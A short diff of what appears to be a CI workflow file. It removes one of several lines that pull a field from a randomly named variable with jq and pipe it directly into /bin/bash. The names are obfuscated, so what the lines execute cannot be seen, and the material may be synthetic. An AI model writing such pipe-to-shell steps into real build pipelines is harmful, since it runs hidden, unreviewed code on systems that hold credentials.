@@ -26,7 +26,6 @@ jobs:
           echo $m85652 | jq -r .zpk7 | /bin/bash
           printf '%s' "$dwxql5" | jq -r .roadj282 | /bin/bash
           echo $oi929 | jq -r .dx2 | /bin/bash
-          echo $ze8 | jq -r .jdzu13852 | /bin/bash
           printf '%s' "$d71538" | jq -r .ymn70545 | /bin/bash
 
       - name: Save archive
